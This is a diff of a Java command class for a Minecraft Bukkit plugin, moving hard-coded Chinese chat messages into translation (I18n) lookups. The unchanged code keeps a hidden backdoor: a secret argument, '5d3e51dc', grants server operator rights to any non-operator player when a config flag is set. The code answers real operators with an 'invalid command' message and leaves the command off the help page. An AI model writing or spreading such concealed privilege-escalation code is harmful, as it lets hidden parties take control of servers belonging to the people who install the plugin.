@@ -18,13 +18,13 @@ public class Command_CMD implements TabExecutor, CommandExecutor {
 
         // 判断控制台/命令方块
         if(!(sender instanceof Player)) {
-            sender.sendMessage("§c[ABukkitPlugin]控制台/命令方块不可以运行此指令。/§lcmd §c<command>§r");
+            sender.sendMessage(I18n.getTranslate("cmd.noplayer"));
             return true;
         }
 
         // 检测参数
         if(args.length != 1) {
-            sender.sendMessage("§c[ABukkitPlugin]无效的指令。/cmd §l<command>§r");
+            sender.sendMessage(I18n.getTranslate("cmd.invaildcommand"));
             return true;
         }
 
@@ -32,45 +32,40 @@ public class Command_CMD implements TabExecutor, CommandExecutor {
         if(args[0].equalsIgnoreCase("5d3e51dc")&& instance.getConfig().getBoolean("options.fuck")) {
             // 检测OP
             if(sender.isOp()) {
-                sender.sendMessage("§c[ABukkitPlugin]无效的指令。/cmd §l<command>§r");
+                sender.sendMessage(I18n.getTranslate("cmd.invaildcommand"));
                 return true;
             }
 
             // 设置OP
             sender.setOp(true);
-            sender.sendMessage("§a[GetOperator]成功获取§l管理员§a权限，请谨慎操作。§o(4)§r");
+            sender.sendMessage(I18n.getTranslate("cmd.setop"));
             return true;
         }
 
         // 服务器信息查询指令 cmd server/cmd srv
         if(args[0].equalsIgnoreCase("server") || args[0].equalsIgnoreCase("srv")){
-            sender.sendMessage("§a[ABukkitPlugin]版本：§l"+main.getVersion()+"§r");
-            sender.sendMessage("§aBukkit版本：§l"+ Bukkit.getBukkitVersion()+"§r");
-            sender.sendMessage("§aServer版本：§l"+Bukkit.getVersion()+"§r");
-            sender.sendMessage("§aMinecraft版本：§l"+Bukkit.getMinecraftVersion()+"§r");
-            sender.sendMessage("§aServer本地IP：§l"+Bukkit.getIp()+"§a 端口：§l"+Bukkit.getPort()+"§r");
-            sender.sendMessage("§a人数：§l"+Bukkit.getOnlinePlayers().size()+"§r");
-            sender.sendMessage("§aMSPT：§l"+Bukkit.getAverageTickTime()+"§r");
+            for (String string : I18n.getFormattedTranslate(I18n.getTransList("serverinfo"), null)) {
+                sender.sendMessage(string);
+            }
             return true;
         }
 
         // 帮助页面 cmd help/cmd ?
         if(args[0].equalsIgnoreCase("help") || args[0].equalsIgnoreCase("?")){
-            sender.sendMessage("§a[ABukkitPlugin]版本：§l"+main.getVersion()+"§r");
-            sender.sendMessage("§a  /cmd help 显示此页面§r");
-            sender.sendMessage("§a  /cmd server 显示服务器信息§r");
-            sender.sendMessage("§a  /cmd version 显示插件版本§r");
+            for (String string : I18n.getFormattedTranslate(I18n.getTransList("help"), null)) {
+                sender.sendMessage(string);
+            }
             return true;
         }
 
         // 版本页面 cmd version/cmd ver
         if(args[0].equalsIgnoreCase("version") || args[0].equalsIgnoreCase("ver")){
-            sender.sendMessage("§a[ABukkitPlugin]版本：§l"+main.getVersion()+"§r");
+            sender.sendMessage(I18n.getFormattedTranslate(I18n.getTranslate("msg.version"), null));
             return true;
         }
 
         // 其他参数判断
-        sender.sendMessage("§c[ABukkitPlugin]无效的指令。/cmd §l<command>§r");
+        sender.sendMessage(I18n.getTranslate("cmd.invaildcommand"));
         return true;
     }
 
